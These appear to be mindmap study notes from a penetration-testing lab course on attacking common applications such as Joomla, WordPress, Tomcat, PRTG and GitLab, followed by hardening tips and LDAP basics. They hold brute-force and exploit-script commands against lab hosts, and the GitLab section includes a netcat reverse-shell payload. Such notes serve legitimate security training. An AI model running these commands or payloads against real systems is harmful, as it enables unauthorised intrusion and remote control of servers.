---
mindmap-plugin: basic
---

# Attacking Common Applications

## Application Discovery & Enumeration Tips
- Scripts
	- nmap -p 80,443,8000,8080,8180,8888,1000 --open -oA web_discovery -iL scope_list
	- robots.txt file for a Joomla site
- Tools
	- eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
	- cat web_discovery.xml | ./aquatone -nmap
## CMS, Web Content Management
- Joomla
	- Enumeration
		- curl -s http;//dev.inlanefreight.local | grep Joomla
	- Tools
		- droopescan scan joomla --url http;//dev.inlanefreight.local/
		- python2.7 joomlascan.py -u http;//dev.inlanefreight.local
	- Attacking
		- Abusing Built-In Functionality to RCE
		- Leveraging Known Vulnerabilities
		- sudo python3 joomla-brute.py -u http;//dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
		- python2.7 joomla_dir_trav.py --url "http;//dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
- Drupal
	- Enumeration
		- curl -s http;//drupal.inlanefreight.local | grep Drupal
	- Tools
		- droopescan scan drupal -u http;//drupal.inlanefreight.local
	- Attacking
		- Leveraging the PHP Filter Module
		- Uploading a Backdoored Module
		- Leveraging Known Vulnerabilities
			- Drupalgeddon
			- Drupalgeddon2
			- Drupalgeddon3
- WordPress
	- Enumeration
		- curl -s http:// blog.inlanefreight.local | grep WordPress
		- identify a WordPress site is by browsing to the /robots.txt file
		- enumerate user at /wp-login.php.
	- Tools
		- sudo wpscan --url http ://blog.inlanefreight.local --enumerate --api-token dEOFB
	- Attacking
		- Login Bruteforce
		- Remote Code Execution using PHP
		- MSF wp_admin_shell_upload
		- Leveraging Known Vulnerabilities
- DotNetNuke
## Application Servers
- Apache Tomcat
	- Footprinting
		-  curl -s http:// app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
		- gobuster dir -u http:// web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
	- Attacking
		- Tomcat Manager - WAR File Upload
		- Tomcat Manager - Login Brute Force
- Phusion Passengeer
- Oracle WebLogic
- IBM WebSphere
## Security Information and Event Management (SIEM)
- Splunk
- Trustwave
- LogRhythm
## Network Management
- PRTG Network Monitor
	- Footprinting
		- sudo nmap -sV -p- --open -T4 10.129.201.50
		- curl -s http:// 10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
	- Attacking
		- Leveraging Known Vulnerabilities
			- sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 
- ManageEngine Opmanger
## IT Management
- Nagios
- Puppet
- Zabbix
- ManageEngine ServiceDesk Plus
## Software Frameworks
- JBoss
- Axis2
## Customer Service Management
- osTicket
	- Footprinting
		- sudo python3 dehashed.py -q inlanefreight.local -p
- Zendesk
## Search Engines
- Elasticsearch
- Apache Solr
## Software Configuration Management
- Atlassian JIRA
- GitHub
- GitLab
	- Footprinting
		- ./gitlab_userenum.sh --url http:// gitlab.inlanefreight.local:8081/ --userlist users.txt
	- Attacks
		- Authenticated RCE
			- python3 gitlab_13_10_2_rce.py -t http:// gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
- Bugzilla
- Bugsnag
- Bitbucket
## Software Development Tools
- Jenkins
- Atlassian Confluence
- phpMyAdmin
## Enterprise Application Integration
- Oracle Fusion Middleware
- BizTalk Server
- Apache ActiveMQ
## Thick Client Applications
- Attacks
	- Improper Error Handling.
	- Hardcoded sensitive data.
	- DLL Hijacking.
	- Buffer Overflow.
	- SQL Injection.
	- Insecure Storage.
	- Session Management.
- Client Side Attacks Tools
	- Ghidra
	- IDA
	- OllyDbg
	- Radare2
	- dnSpy
	- x64dbg
	- JADX
	- Frida
- Network Side Attacks Tools
	- Wireshark
	- tcpdump
	- TCPView
	- Burp Suite
- Server Side Attacks
	- Similar to OWASP Top Ten
## Application Hardening Tips
- Secure authentication
	- Applications should enforce strong passwords during registration and setup, and default administrative account passwords should be changed
	- If possible, the default administrative accounts should be disabled, with new custom administrative accounts created
	- 2FA
- Access controls
	- Proper access control mechanisms should be implemented per application
- Disable unsafe features
	- Features such as PHP code editing in WordPress can be disabled to prevent code execution if the server is compromised.
- Regular updates
	- Applications should be updated regularly, and patches supplied by vendors should be applied as soon as possible
- Backups
	- System administrators should always configure website and database backups
- Security monitoring
	- Many solutions
	- WAF
- LDAP integration with Active Directory
## LDAP
- Commonly used for:
	- Authentication
		- Central authentication
	- Authorisation
		- LDAP can manage permissions and access control
		- used for network resources such as folders or files on a network share.
		- may require additional configuration or integration with protocols like Kerberos.
	- Directory Services
		- LDAP provides a way to search, retrieve, and modify data stored in a directory
		- LDAP is based on the X.500 standard for directory services.
	- Synchronisation
		- LDAP can be used to keep data consistent across multiple systems
		- replicating changes made in one directory to another.
- Issues
	- Compliance - Directory servers must be LDAP compliant for service to be deployed, which may limit the choice of vendors and products.
	- Complexity - Difficult to use and understand for many developers and administrators, who may not know how to configure LDAP clients correctly or use it securely.
	- Enryption - LDAP does not encrypt its traffic by default. LDAPS (LDAP over SSL) or StartTLS must be used to enable encryption.
	- Injection - Vulnerable to LDAP injection attacks, where malicious users can manipulate LDAP queries and gain unauthorised access to data or resources. 
- OpenLDAP vs Active Directory
	- OpenLDAP
		- An open and cross-platform protocol that can be used with different types of directory servers and applications.
		- A protocol that defines how clients and servers communicate with each other to access and manipulate data stored in a directory service.
		- It has a flexible and extensible schema that allows custom attributes and object classes to be defined by administrators or developers.
		- Supports multiple authentication mechanisms such as simple bind, SASL, etc.
	- Active Directory
		- Proprietary software that only works with Windows-based systems and requires additional components such as DNS (Domain Name System) and Kerberos for its functionality.
		- A directory server that uses LDAP as one of its protocols to provide authentication, authorisation, and other services for Windows-based networks.
		- It has a predefined schema that follows and extends the X.500 standard with additional object classes and attributes specific to Windows environments.
		- It supports Kerberos as its primary authentication mechanism but also supports NTLM (NT LAN Manager) and LDAP over SSL/TLS for backward compatibility.
- LDAP request/response components
	- Request
		- Session connection
		- Request type
		- Request parameters
		- Request ID
	- Response
		- Response type
		- Result code
		- Matched DN
		- Referral
		- Response data
- Interaction with LDAP
	- ldapsearch
		- is a command-line utility used to search for information stored in a directory using the LDAP protocol. 
		- It is commonly used to query and retrieve data from an LDAP directory service.
		- ldapsearch -H ldap//url:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john@ggjaog)"
- Attacks
	- LDAP Injection


